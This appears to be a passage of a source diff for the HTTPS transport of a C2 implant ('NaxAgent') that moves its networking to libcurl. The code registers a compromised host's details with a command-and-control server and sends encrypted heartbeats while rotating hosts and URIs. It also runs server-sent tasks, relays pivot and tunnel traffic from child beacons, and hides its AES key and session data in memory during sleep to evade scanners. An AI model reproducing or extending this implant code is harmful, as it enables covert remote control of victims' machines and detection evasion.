+    if (http_code != 200) {
+        DBG_ERR("HTTP %ld — discarding response", http_code);
+        if (resp.data) free(resp.data);
+        return NULL;
+    }
+
+    *out_len = (uint32_t)resp.size;
+    return resp.data; /* caller must free; may be NULL with *out_len=0 (empty 200) */
 }
 
 /* ===== HTTP POST (pre-profile and post-profile) ===== */
-/* profile_loaded: 0 = pre-profile (beacon ID in X-Beacon-Id, body raw)
- *                 1 = post-profile (use PostClientMeta / PostClientOutput) */
 static uint8_t *https_post(NaxAgent *a,
                              const uint8_t *body, uint32_t body_len,
                              int profile_active,
                              uint32_t *out_resp_len)
 {
-    /* Encode body per PostClientOutput (only when profile active) */
+    /* Encode body per PostClientOutput */
     uint8_t *send_body = (uint8_t *)body;
     uint32_t send_len  = body_len;
     uint8_t *enc_body  = NULL;
 
     if (profile_active) {
-        /* worst case: mask(+4) + hex_encode(*2) + prepend/append (1KB margin) */
         uint32_t enc_cap = (body_len + 4) * 2 + 1024;
         enc_body = (uint8_t *)malloc(enc_cap);
         if (enc_body) {
             uint32_t enc_len = nax_encode_post_output(body, body_len,
-                                                        (char *)enc_body, enc_cap);
+                                                       (char *)enc_body, enc_cap);
             if (enc_len > 0) { send_body = enc_body; send_len = enc_len; }
         }
     }
 
-    /* Encode ClientMeta (session ID) for POST header — uses post_client_META config */
+    /* Encode ClientMeta (session ID) for POST header */
     char meta_enc[2048] = {0};
     uint32_t meta_len = 0;
     if (profile_active) {
@@ -623,7 +485,7 @@ static uint8_t *https_post(NaxAgent *a,
                                          meta_enc, sizeof(meta_enc));
     }
 
-    /* Build request headers */
+    /* Build request header block */
     char hdrs[4096];
     uint32_t hdr_len;
     if (profile_active) {
@@ -631,7 +493,7 @@ static uint8_t *https_post(NaxAgent *a,
                                              meta_enc, meta_len,
                                              0 /*POST*/, hdrs, sizeof(hdrs));
     } else {
-        /* Pre-profile: headers built from volatile strings */
+        /* Pre-profile: minimal headers (beacon ID + public flag) */
         hdr_len = (uint32_t)snprintf(hdrs, sizeof(hdrs),
             "%s: %s\r\n"
             "Content-Type: application/octet-stream\r\n"
@@ -640,43 +502,18 @@ static uint8_t *https_post(NaxAgent *a,
             g_public_hdr);
     }
 
-    const char *uri = profile_active ? nax_profile_post_uri_rotate() : g_uri_post;
-    const char *req_host = g_cur_host[0] ? g_cur_host : a->cfg.c2_host;
-    char req[512];
-    int req_len = snprintf(req, sizeof(req),
-        "POST %s HTTP/1.1\r\n"
-        "Host: %s\r\n"
-        "User-Agent: %s\r\n",
-        uri, req_host, g_user_agent);
+    const char *uri   = profile_active ? nax_profile_post_uri_rotate() : g_uri_post;
+    char url[512];
+    build_url(a, uri, url, sizeof(url));
 
-    /* Content-Length header — required for POST body, not added by nax_build_request_headers */
-    char clen_hdr[64];
-    int clen_hdr_len = snprintf(clen_hdr, sizeof(clen_hdr),
-        "Content-Length: %u\r\n", send_len);
+    DBG("POST %s (profile=%d body=%u)", url, profile_active, send_len);
 
     pthread_mutex_lock(&g_https_mutex);
-
-    /* Reconnect if the connection was closed by a previous operation
-     * (e.g. https_get closing after the heartbeat). Each operation
-     * owns its own connection — no reuse across GET/POST. */
-    if (!g_ssl || g_sock < 0) {
-        if (https_tls_connect(a) < 0) {
-            pthread_mutex_unlock(&g_https_mutex);
-            if (enc_body) free(enc_body);
-            return NULL;
-        }
-    }
-
-    uint8_t *resp = NULL;
-    if (tls_write_all(req, req_len) == 0 &&
-        tls_write_all(hdrs, (int)hdr_len) == 0 &&
-        tls_write_all(clen_hdr, clen_hdr_len) == 0 &&
-        tls_write_all("\r\n", 2) == 0 &&
-        tls_write_all(send_body, (int)send_len) == 0) {
-        int clen = read_http_headers();
-        resp = tls_read_body(clen, out_resp_len);
-    }
-    https_cleanup();                 /* close connection after POST */
+    uint8_t *resp = curl_do_request(a, url,
+                                     0 /*POST*/,
+                                     hdrs, hdr_len,
+                                     send_body, send_len,
+                                     out_resp_len);
     pthread_mutex_unlock(&g_https_mutex);
 
     if (enc_body) free(enc_body);
@@ -686,7 +523,8 @@ static uint8_t *https_post(NaxAgent *a,
         uint8_t *dec = (uint8_t *)malloc(*out_resp_len + 256);
         if (dec) {
             uint32_t dec_len = nax_decode_server_output(resp, *out_resp_len,
-                                                          0 /*POST*/, dec, *out_resp_len + 256);
+                                                          0 /*POST*/, dec,
+                                                          *out_resp_len + 256);
             if (dec_len > 0) {
                 free(resp); resp = dec; *out_resp_len = dec_len;
             } else {
@@ -697,7 +535,7 @@ static uint8_t *https_post(NaxAgent *a,
     return resp;
 }
 
-/* ===== HTTP GET (heartbeat with profile) ===== */
+/* ===== HTTP GET (heartbeat) ===== */
 static uint8_t *https_get(NaxAgent *a,
                             const uint8_t *hb_enc, uint32_t hb_enc_len,
                             uint32_t *out_resp_len)
@@ -707,65 +545,42 @@ static uint8_t *https_get(NaxAgent *a,
     uint32_t meta_len = nax_encode_get_meta(hb_enc, hb_enc_len,
                                               meta_enc, sizeof(meta_enc));
 
-    /* Build request headers */
+    /* Build header block */
     char hdrs[4096];
     uint32_t hdr_len = nax_build_request_headers(a->session_id,
                                                    meta_enc, meta_len,
                                                    1 /*GET*/, hdrs, sizeof(hdrs));
 
     const char *uri = nax_profile_get_uri_rotate();
-    const char *host = g_cur_host[0] ? g_cur_host : a->cfg.c2_host;
-    char req[512];
-    int req_len = snprintf(req, sizeof(req),
-        "GET %s HTTP/1.1\r\n"
-        "Host: %s\r\n"
-        "User-Agent: %s\r\n",
-        uri, host, g_user_agent);
+    char url[512];
+    build_url(a, uri, url, sizeof(url));
+
+    DBG("GET %s", url);
 
     pthread_mutex_lock(&g_https_mutex);
-
-    /* Ensure connection is alive. In normal flow nax_https_main already
-     * opened it, but be defensive: if a previous POST closed it, reconnect. */
-    if (!g_ssl || g_sock < 0) {
-        if (https_tls_connect(a) < 0) {
-            pthread_mutex_unlock(&g_https_mutex);
-            *out_resp_len = UINT32_MAX;
-            return NULL;
-        }
-    }
-
-    uint8_t *resp = NULL;
-    int _get_ok = (tls_write_all(req, req_len) == 0 &&
-                   tls_write_all(hdrs, (int)hdr_len) == 0 &&
-                   tls_write_all("Connection: keep-alive\r\n\r\n", 26) == 0);
-    if (_get_ok) {
-        int clen = read_http_headers();
-        if (clen >= 0) {
-            resp = tls_read_body(clen, out_resp_len);
-        } else {
-            *out_resp_len = UINT32_MAX; /* network/HTTP error sentinel */
-        }
-    } else {
-        *out_resp_len = UINT32_MAX; /* write failed */
-    }
-    https_cleanup();                 /* close connection after GET */
+    uint8_t *resp = curl_do_request(a, url,
+                                     1 /*GET*/,
+                                     hdrs, hdr_len,
+                                     NULL, 0,
+                                     out_resp_len);
     pthread_mutex_unlock(&g_https_mutex);
 
-    /* Decode server output (base64url → raw AES-CBC) */
-    if (resp && *out_resp_len > 0) {
+    if (!resp) return NULL;
 
-        /* Check if this is the EmptyResp (no tasks) — sent verbatim by server,
-         * NOT AES-encrypted. If so, return 0 bytes so caller treats it as NO_TASKS */
-        if (nax_is_empty_resp(resp, *out_resp_len)) {
-            free(resp);
-            *out_resp_len = 0;
-            return NULL;
-        }
+    /* Check EmptyResp (no tasks) */
+    if (*out_resp_len > 0 && nax_is_empty_resp(resp, *out_resp_len)) {
+        free(resp);
+        *out_resp_len = 0;
+        return NULL;
+    }
 
+    /* Decode server output */
+    if (*out_resp_len > 0) {
         uint8_t *dec = (uint8_t *)malloc(*out_resp_len + 256);
         if (dec) {
             uint32_t dec_len = nax_decode_server_output(resp, *out_resp_len,
-                                                          1 /*GET*/, dec, *out_resp_len + 256);
+                                                          1 /*GET*/, dec,
+                                                          *out_resp_len + 256);
             if (dec_len > 0) {
                 free(resp); resp = dec; *out_resp_len = dec_len;
             } else {
@@ -803,7 +618,7 @@ static int https_send_result(NaxAgent *a, uint32_t task_id, uint8_t status,
     return rc;
 }
 
-/* ===== nax_send_tunnel_result (used by tunnel.c) ===== */
+/* ===== nax_send_tunnel_result (called from tunnel.c) ===== */
 int nax_send_tunnel_result(NaxAgent *a, const uint8_t *data, uint32_t data_len)
 {
     return https_send_result(a, 0, NAX_STATUS_TUNNEL, data, data_len);
@@ -831,22 +646,19 @@ static int https_handle_frames(NaxAgent *a, const uint8_t *enc, uint32_t enc_len
             nax_apply_profile(fb, fbl);
             continue;
         }
-        if (ft == NAX_WIRE_NO_TASKS) {
-            break;
-        }
-        if (ft != NAX_WIRE_TASK) {
-            continue;
-        }
+        if (ft == NAX_WIRE_NO_TASKS) break;
+        if (ft != NAX_WIRE_TASK)     continue;
+
         tasks_dispatched++;
 
         NaxTask task;
         if (nax_decode_task(fb, fbl, &task) < 0) {
-            DBG_ERR("nax_decode_task failed for frame body_len=%u", fbl);
+            DBG_ERR("nax_decode_task failed body_len=%u", fbl);
             continue;
         }
 
         extern const char *nax_cmd_name(uint8_t);
-        DBG("→ task received: cmd=0x%02x (%s) task_id=%u args_len=%u",
+        DBG("→ task cmd=0x%02x (%s) id=%u args=%u",
             task.cmd_id, nax_cmd_name(task.cmd_id), task.task_id, task.args_len);
 
         uint8_t *result = NULL; uint32_t result_len = 0;
@@ -855,48 +667,42 @@ static int https_handle_frames(NaxAgent *a, const uint8_t *enc, uint32_t enc_len
         uint8_t status = nax_dispatch(a, &task, &result, &result_len);
 
         if (status == NAX_STATUS_OK)
-            DBG_OK("cmd=0x%02x (%s) task_id=%u → OK result_len=%u",
+            DBG_OK("cmd=0x%02x (%s) id=%u → OK result=%u",
                    task.cmd_id, nax_cmd_name(task.cmd_id), task.task_id, result_len);
         else if (status == NAX_STATUS_ASYNC)
-            DBG("cmd=0x%02x (%s) task_id=%u → ASYNC (background)",
-                task.cmd_id, nax_cmd_name(task.cmd_id), task.task_id);
+            DBG("cmd=0x%02x (%s) id=%u → ASYNC", task.cmd_id, nax_cmd_name(task.cmd_id), task.task_id);
         else
-            DBG_ERR("cmd=0x%02x (%s) task_id=%u → ERR status=0x%02x result_len=%u",
+            DBG_ERR("cmd=0x%02x (%s) id=%u → ERR 0x%02x result=%u",
                     task.cmd_id, nax_cmd_name(task.cmd_id), task.task_id, status, result_len);
 
         if (status != NAX_STATUS_ASYNC) {
-            DBG("sending POST result task_id=%u status=0x%02x result_len=%u",
-                task.task_id, status, result_len);
             https_send_result(a, task.task_id, status, result, result_len);
-            DBG_OK("POST result sent for task_id=%u", task.task_id);
+            DBG_OK("result sent id=%u", task.task_id);
         }
         if (result) free(result);
 
-        /* Apply deferred profile AFTER result is sent with old encoding */
         if (was_profile_update && a->pending_profile_data) {
-            DBG("applying deferred profile (%u bytes) after result POST", a->pending_profile_len);
+            DBG("applying deferred profile (%u bytes)", a->pending_profile_len);
             nax_apply_profile(a->pending_profile_data, a->pending_profile_len);
             free(a->pending_profile_data);
             a->pending_profile_data = NULL;
             a->pending_profile_len  = 0;
             a->profile_pending = 1;
-            DBG_OK("new profile active — next heartbeat will use new encoding/URIs");
+            DBG_OK("new profile active");
         }
     }
     free(plain);
     return tasks_dispatched;
 }
 
-/* ===== process_pivots — relay child pivot data to C2 via HTTPS POST =====
- * Identical logic to tcp.c process_pivots but uses https_send_result.
- * Called in the beacon loop alongside nax_process_tunnels. */
+/* ===== process_pivots ===== */
 static int process_pivots(NaxAgent *a)
 {
     int relayed = 0;
     NaxPivot **pp = &a->pivot_head;
     while (*pp) {
         NaxPivot *p = *pp;
-        int broken = 0;
+        int broken  = 0;
 
         struct pollfd pfd = { .fd = p->sock, .events = POLLIN };
         while (1) {
@@ -904,7 +710,6 @@ static int process_pivots(NaxAgent *a)
             if (pr <= 0) break;
             if (!(pfd.revents & POLLIN)) break;
 
-            /* Read length-prefixed message from child beacon */
             uint8_t lenbuf[4]; ssize_t got = 0;
             while (got < 4) {
                 ssize_t r = recv(p->sock, lenbuf + got, 4 - got, 0);
@@ -927,7 +732,6 @@ static int process_pivots(NaxAgent *a)
             }
             if (broken) break;
 
-            /* Pack: [PIV_TYPE_DATA(1)][pivot_id(4LE)][msg_len(4LE)][msg] */
             uint32_t rd_len = 1 + 4 + 4 + msg_len;
             uint8_t *rd = (uint8_t *)malloc(rd_len);
             if (rd) {
@@ -945,12 +749,11 @@ static int process_pivots(NaxAgent *a)
         }
 
         if (broken) {
-            /* Child disconnected — notify C2 */
             uint8_t unlink_data[6];
             unlink_data[0] = NAX_PIV_TYPE_UNLINK;
             unlink_data[1] = (uint8_t)(p->pivot_id);       unlink_data[2] = (uint8_t)(p->pivot_id >> 8);
             unlink_data[3] = (uint8_t)(p->pivot_id >> 16); unlink_data[4] = (uint8_t)(p->pivot_id >> 24);
-            unlink_data[5] = 2; /* NAX_PIVOT_TYPE_TCP */
+            unlink_data[5] = 2;
             https_send_result(a, 0, NAX_STATUS_OK, unlink_data, sizeof(unlink_data));
             close(p->sock);
             *pp = p->next;
@@ -962,39 +765,41 @@ static int process_pivots(NaxAgent *a)
     return relayed;
 }
 
+/* ===== async BOF drain ===== */
 static void https_async_cb(uint32_t task_id, uint8_t status,
                             const char *output, uint32_t output_len,
-                            void *user_data) {
+                            void *user_data)
+{
     NaxAgent *a = (NaxAgent *)user_data;
     https_send_result(a, task_id, status, (uint8_t *)output, output_len);
 }
 
-static void nax_https_drain_async(NaxAgent *a) {
+static void nax_https_drain_async(NaxAgent *a)
+{
     nax_async_drain(https_async_cb, a);
 }
 
+/* ===== main agent loop ===== */
 void nax_https_main(NaxAgent *a)
 {
     nax_https_init_strings();
     signal(SIGPIPE, SIG_IGN);
     gen_session_id(a->session_id);
+
+    /* libcurl global init (once per process) */
+    curl_global_init(CURL_GLOBAL_ALL);
+
     nax_bof_sdk_init();
 
     NaxSysInfo info;
     nax_gather_sysinfo(&info);
 
     while (a->running) {
-        /* Connect */
+        /* ── Registration loop ── */
         https_rotate_host(a);
-        while (a->running && https_tls_connect(a) < 0) {
-            sleep(3);
-            https_rotate_host(a);
-        }
-        if (!a->running) break;
-
         int registered = 0;
+
         while (a->running && !registered) {
-            /* Build REGISTER frame */
             uint8_t reg_body[4096]; uint32_t reg_body_len = sizeof(reg_body);
             if (nax_build_reg_body(
                     info.hostname, strlen(info.hostname),
@@ -1004,46 +809,44 @@ void nax_https_main(NaxAgent *a)
                     info.procname, strlen(info.procname), info.elevated,
                     info.os_major, info.os_minor, info.os_build,
                     info.ppid, 0, 0, info.imgpath, strlen(info.imgpath),
-                    reg_body, &reg_body_len) < 0) continue;
+                    reg_body, &reg_body_len) < 0) { sleep(3); continue; }
 
             uint8_t *frame = (uint8_t *)malloc(NAX_IO_CAP);
-            if (!frame) continue;
+            if (!frame) { sleep(3); continue; }
             uint32_t frame_len = NAX_IO_CAP;
             if (nax_frame_encode(NAX_WIRE_REGISTER, reg_body, reg_body_len,
-                                 frame, &frame_len) < 0) { free(frame); continue; }
+                                 frame, &frame_len) < 0) { free(frame); sleep(3); continue; }
 
             uint32_t enc_cap = frame_len + NAX_AES_IV + NAX_AES_BLOCK + 32;
             uint8_t *enc = (uint8_t *)malloc(enc_cap);
-            if (!enc) { free(frame); continue; }
+            if (!enc) { free(frame); sleep(3); continue; }
             uint32_t enc_len = enc_cap;
             if (nax_encrypt(a->cfg.aes_key, frame, frame_len, enc, &enc_len) < 0) {
-                free(frame); free(enc); continue;
+                free(frame); free(enc); sleep(3); continue;
             }
             free(frame);
 
             uint32_t resp_len = 0;
             DBG_SEC("REGISTER");
-            DBG("sending REGISTER (pre-profile) to %s", g_cur_host[0] ? g_cur_host : a->cfg.c2_host);
+            DBG("sending REGISTER to %s", g_cur_host[0] ? g_cur_host : a->cfg.c2_host);
             uint8_t *resp = https_post(a, enc, enc_len, 0 /*pre-profile*/, &resp_len);
             free(enc);
 
             if (!resp || resp_len == 0) {
-                DBG_ERR("REGISTER failed — no response (resp=%p resp_len=%u)", (void*)resp, resp_len);
+                DBG_ERR("REGISTER failed — no response");
                 if (resp) free(resp);
                 sleep(3);
+                https_rotate_host(a);
                 continue;
             }
             DBG("REGISTER response: %u bytes", resp_len);
 
-            /* Decrypt PROFILE response (raw AES-CBC, no ServerOutput decode
-             * because we sent pre-profile) */
+            /* Decrypt PROFILE response (raw AES-CBC, no ServerOutput decode) */
             uint8_t *plain = (uint8_t *)malloc(resp_len + NAX_AES_BLOCK);
-            if (!plain) { free(resp); continue; }
+            if (!plain) { free(resp); sleep(3); continue; }
             uint32_t plain_len = resp_len + NAX_AES_BLOCK;
             if (nax_decrypt(a->cfg.aes_key, resp, resp_len, plain, &plain_len) < 0) {
-                free(resp); free(plain);
-                sleep(3);
-                continue;
+                free(resp); free(plain); sleep(3); continue;
             }
             free(resp);
 
@@ -1053,36 +856,24 @@ void nax_https_main(NaxAgent *a)
             }
 
             if (ft == NAX_WIRE_PROFILE) {
-                DBG_OK("REGISTER response: got PROFILE frame (%u bytes) — profile applied", fbl);
+                DBG_OK("REGISTER: got PROFILE (%u bytes)", fbl);
                 nax_apply_profile(fb, fbl);
                 extern void nax_dbg_print_profile_pub(void);
                 nax_dbg_print_profile_pub();
                 registered = 1;
-                DBG_OK("REGISTERED successfully — entering heartbeat loop");
+                DBG_OK("REGISTERED — entering heartbeat loop");
             } else {
-                DBG_ERR("REGISTER response: unexpected frame type=0x%02x (expected PROFILE)", ft);
+                DBG_ERR("REGISTER: unexpected frame type=0x%02x", ft);
             }
             free(plain);
         }
         if (!a->running) break;
 
-        /* ── Heartbeat loop ─────────────────────────────────────────
-         * No connection reuse: each iteration opens a fresh TLS
-         * connection, sends the heartbeat, and closes it. This avoids
-         * the alternating success/failure pattern caused by stale
-         * keep-alive sockets behind CDNs/proxies.
-         */
+        /* ── Heartbeat loop ── */
         while (a->running) {
-            /* Fresh connection every cycle */
             https_rotate_host(a);
-            https_cleanup();
-            while (a->running && https_tls_connect(a) < 0) {
-                sleep(3);
-                https_rotate_host(a);
-            }
-            if (!a->running) break;
 
-            /* GET with encrypted heartbeat */
+            /* GET — encrypted heartbeat */
             uint8_t hb_frame[256]; uint32_t hb_frame_len = sizeof(hb_frame);
             if (nax_build_heartbeat(hb_frame, &hb_frame_len) < 0) continue;
 
@@ -1098,92 +889,66 @@ void nax_https_main(NaxAgent *a)
             uint8_t *resp = https_get(a, hb_enc, hb_enc_len, &resp_len);
             DBG("→ GET %s (host=%s sleep=%ums jitter=%u%%)",
                 nax_profile_get_uri(),
-                g_cur_host[0] ? g_cur_host : a->cfg.c2_host, a->cfg.sleep_ms, a->cfg.jitter_pct);
+                g_cur_host[0] ? g_cur_host : a->cfg.c2_host,
+                a->cfg.sleep_ms, a->cfg.jitter_pct);
             free(hb_enc);
 
             if (!resp) {
                 if (resp_len == 0) {
-                    DBG("GET response: EmptyResp (no tasks) — connection OK");
+                    DBG("GET: EmptyResp — no tasks");
                 } else {
-                    DBG_ERR("GET failed — network error resp_len=%u, will reconnect next cycle", resp_len);
+                    DBG_ERR("GET failed (resp_len=%u)", resp_len);
                 }
             } else {
-                DBG_OK("GET response: %u bytes — processing frames", resp_len);
+                DBG_OK("GET: %u bytes — processing", resp_len);
             }
 
-            /* Process task frames — had_tasks only if real TASK frames were dispatched */
             int had_tasks = 0;
-            if (resp && resp_len > 0) {
+            if (resp && resp_len > 0)
                 had_tasks = https_handle_frames(a, resp, resp_len);
-            }
             if (resp) free(resp);
 
-            /* Check if there's pending pivot data before deciding to sleep */
+            /* Check pending pivot data */
             int has_pivot_data = 0;
             if (a->pivot_head) {
                 NaxPivot *p = a->pivot_head;
                 while (p && !has_pivot_data) {
                     struct pollfd pfd = { .fd = p->sock, .events = POLLIN };
-                    if (poll(&pfd, 1, 0) > 0 && (pfd.revents & POLLIN)) {
+                    if (poll(&pfd, 1, 0) > 0 && (pfd.revents & POLLIN))
                         has_pivot_data = 1;
-                    }
                     p = p->next;
                 }
             }
 
-            /* Relay pivots — only if there is actual pending data */
-            if (has_pivot_data) {
+            if (has_pivot_data)
                 process_pivots(a);
-            }
+
             nax_opsec_heartbeat();
-            { /* relay tunnels */
-                uint8_t *tbuf = (uint8_t *)malloc(4*1024*1024);
+
+            /* Relay tunnels */
+            {
+                uint8_t *tbuf = (uint8_t *)malloc(4 * 1024 * 1024);
                 if (tbuf) {
-                    uint32_t tl = nax_process_tunnels_ex(a, tbuf, 4*1024*1024);
+                    uint32_t tl = nax_process_tunnels_ex(a, tbuf, 4 * 1024 * 1024);
                     if (tl > 0) https_send_result(a, 0, NAX_STATUS_TUNNEL, tbuf, tl);
                     free(tbuf);
                 }
             }
 
-            /* Drain completed async BOF results */
             nax_https_drain_async(a);
 
-            if (had_tasks) {
-                continue;
-            }
+            if (had_tasks || has_pivot_data) continue;
 
-            /* If there's pending pivot data, process it immediately without sleeping */
-            if (has_pivot_data) {
-                continue;
-            }
+            /* Apply pending profile */
+            if (nax_profile_apply_pending())
+                DBG("pending profile applied");
 
-            /* Apply pending profile AFTER sending all results with the OLD profile */
-            {
-                extern int nax_profile_apply_pending(void);
-                if (nax_profile_apply_pending()) {
-                    DBG("pending profile applied — next heartbeat uses new profile");
-                }
-            }
-
-            /* Profile burst: skip sleep for 1s after profile_update to ensure
-             * fast heartbeat cycle during profile transition */
-            if (a->cfg.profile_burst_until > 0 && time(NULL) < a->cfg.profile_burst_until) {
-                continue; /* skip sleep entirely */
-            }
+            /* Profile burst: skip sleep */
+            if (a->cfg.profile_burst_until > 0 &&
+                time(NULL) < a->cfg.profile_burst_until) continue;
             a->cfg.profile_burst_until = 0;
 
-            /* ── Sleep obfuscation ───────────────────────────────────────
-             * Strategy: generate a random XOR key per sleep cycle, store
-             * it in a memfd (kernel memory — invisible to userspace memory
-             * scanners), XOR sensitive data before sleeping, then restore
-             * after waking. No mprotect needed — all data stays in heap.
-             *
-             * Data obfuscated:
-             *   a->cfg.aes_key   — AES-128 session key
-             *   a->session_id    — hex session ID
-             *   g_profile        — full malleable profile (via nax_profile_xor)
-             */
-            /* Normal sleep with jitter */
+            /* ── Sleep with obfuscation (memfd key, same as original) ── */
             {
                 uint32_t ms = a->cfg.sleep_ms;
                 if (a->cfg.jitter_pct > 0 && ms > 0) {
@@ -1193,39 +958,24 @@ void nax_https_main(NaxAgent *a)
                     uint32_t delta = (ms * a->cfg.jitter_pct / 100) * r / 255;
                     ms = (r & 1) ? ms + delta : (ms > delta ? ms - delta : 0);
                 }
+
                 if (ms > 0) {
-                    DBG("sleeping %u ms (configured=%u ms jitter=%u%%)",
+                    DBG("sleeping %u ms (configured=%u jitter=%u%%)",
                         ms, a->cfg.sleep_ms, a->cfg.jitter_pct);
 
-                    DBG("[DEBUG] === BEFORE OBFUSCATION ===");
-                    DBG("[DEBUG] AES key full: %02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x",
-                        a->cfg.aes_key[0], a->cfg.aes_key[1], a->cfg.aes_key[2], a->cfg.aes_key[3],
-                        a->cfg.aes_key[4], a->cfg.aes_key[5], a->cfg.aes_key[6], a->cfg.aes_key[7],
-                        a->cfg.aes_key[8], a->cfg.aes_key[9], a->cfg.aes_key[10], a->cfg.aes_key[11],
-                        a->cfg.aes_key[12], a->cfg.aes_key[13], a->cfg.aes_key[14], a->cfg.aes_key[15]);
-                    DBG("[DEBUG] Session ID: %s", a->session_id);
-                    DBG("[DEBUG] Session ID hex[0..3]: %02x %02x %02x %02x",
-                        a->session_id[0], a->session_id[1],
-                        a->session_id[2], a->session_id[3]);
-
-                    /* Key size covers all sensitive fields */
                     #define NAX_OBF_KEY_LEN 64u
                     uint8_t obf_key[NAX_OBF_KEY_LEN];
                     int key_fd = -1;
 
-                    /* 1. Generate random key */
                     FILE *uf = fopen("/dev/urandom", "rb");
                     if (uf) {
                         fread(obf_key, 1, NAX_OBF_KEY_LEN, uf);
                         fclose(uf);
 
-                        /* 2. Store key in memfd — lives in kernel, not
-                         *    visible to /proc/<pid>/mem scanners */
                         key_fd = memfd_create(".", MFD_CLOEXEC);
                         if (key_fd >= 0)
                             write(key_fd, obf_key, NAX_OBF_KEY_LEN);
 
-                        /* 3. XOR sensitive data in-place */
                         volatile uint8_t *kp = (volatile uint8_t *)a->cfg.aes_key;
                         for (uint32_t i = 0; i < NAX_AES_KEY_SIZE; i++)
                             kp[i] ^= obf_key[i % NAX_OBF_KEY_LEN];
@@ -1235,40 +985,21 @@ void nax_https_main(NaxAgent *a)
                             ((volatile uint8_t *)sp)[i] ^=
                                 obf_key[(NAX_AES_KEY_SIZE + i) % NAX_OBF_KEY_LEN];
 
-                        extern void nax_profile_xor(const uint8_t *key, uint32_t key_len);
                         nax_profile_xor(obf_key, NAX_OBF_KEY_LEN);
 
-                        DBG("[DEBUG] === DURING OBFUSCATION ===");
-                        DBG("[DEBUG] AES key full: %02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x",
-                            a->cfg.aes_key[0], a->cfg.aes_key[1], a->cfg.aes_key[2], a->cfg.aes_key[3],
-                            a->cfg.aes_key[4], a->cfg.aes_key[5], a->cfg.aes_key[6], a->cfg.aes_key[7],
-                            a->cfg.aes_key[8], a->cfg.aes_key[9], a->cfg.aes_key[10], a->cfg.aes_key[11],
-                            a->cfg.aes_key[12], a->cfg.aes_key[13], a->cfg.aes_key[14], a->cfg.aes_key[15]);
-                        DBG("[DEBUG] Session ID hex: %02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x",
-                            a->session_id[0], a->session_id[1], a->session_id[2], a->session_id[3],
-                            a->session_id[4], a->session_id[5], a->session_id[6], a->session_id[7],
-                            a->session_id[8], a->session_id[9], a->session_id[10], a->session_id[11],
-                            a->session_id[12], a->session_id[13], a->session_id[14], a->session_id[15]);
-                        DBG("[DEBUG] Key stored in memfd (fd=%d)", key_fd);
-
-
-                        /* Zero key from stack */
                         volatile uint8_t *zp = (volatile uint8_t *)obf_key;
                         for (uint32_t i = 0; i < NAX_OBF_KEY_LEN; i++) zp[i] = 0;
                     }
 
-                    /* 4. Sleep */
                     struct timespec ts = { ms / 1000, (long)(ms % 1000) * 1000000L };
                     nanosleep(&ts, NULL);
 
-                    /* 5. Restore key from memfd and decrypt data */
                     if (key_fd >= 0) {
                         uint8_t restore_key[NAX_OBF_KEY_LEN];
                         lseek(key_fd, 0, SEEK_SET);
                         read(key_fd, restore_key, NAX_OBF_KEY_LEN);
                         close(key_fd);
 
-                        /* XOR again to restore (XOR is its own inverse) */
                         volatile uint8_t *kp = (volatile uint8_t *)a->cfg.aes_key;
                         for (uint32_t i = 0; i < NAX_AES_KEY_SIZE; i++)
                             kp[i] ^= restore_key[i % NAX_OBF_KEY_LEN];
@@ -1278,26 +1009,18 @@ void nax_https_main(NaxAgent *a)
                             ((volatile uint8_t *)sp)[i] ^=
                                 restore_key[(NAX_AES_KEY_SIZE + i) % NAX_OBF_KEY_LEN];
 
-                        extern void nax_profile_xor(const uint8_t *key, uint32_t key_len);
                         nax_profile_xor(restore_key, NAX_OBF_KEY_LEN);
 
-                        /* Zero restore key from stack */
                         volatile uint8_t *zp = (volatile uint8_t *)restore_key;
                         for (uint32_t i = 0; i < NAX_OBF_KEY_LEN; i++) zp[i] = 0;
                     }
-
-                    DBG("sleep done — next heartbeat cycle");
-                } else {
-                    DBG("sleep=0 — immediate next cycle");
+                    DBG("sleep done");
                 }
             }
         }
-
-        https_cleanup();
     }
 
-    https_cleanup();
-    if (g_ssl_ctx) { SSL_CTX_free(g_ssl_ctx); g_ssl_ctx = NULL; }
+    curl_global_cleanup();
 }
 
 #endif /* NAX_HTTPS_MODE */
